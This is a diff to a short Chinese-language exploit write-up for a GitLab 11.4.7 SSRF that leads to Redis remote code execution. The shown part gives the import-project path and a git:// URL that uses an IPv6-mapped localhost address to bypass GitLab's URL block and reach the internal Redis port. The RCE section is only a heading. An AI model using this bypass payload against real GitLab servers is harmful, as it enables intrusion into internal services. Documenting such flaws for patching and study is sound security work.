@@ -2,14 +2,16 @@
 GitLab 11.4.7 SSRF配合redis远程执行代码
 
 ## 0x01 SSRF
-
+#### register user test
+![](./gitlab_ssrf.jpg)
+```
 gitlab >>import project>> Repo by URL >> Git repository URL (ipv6 Bypass block url)
 
 Example:
 127.0.0.1:6379 >> [0:0:0:0:0:ffff:127.0.0.1]:6379
 git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test/ssrf.git
 
-
+```
 
 ## 0x02 redis RCE
 
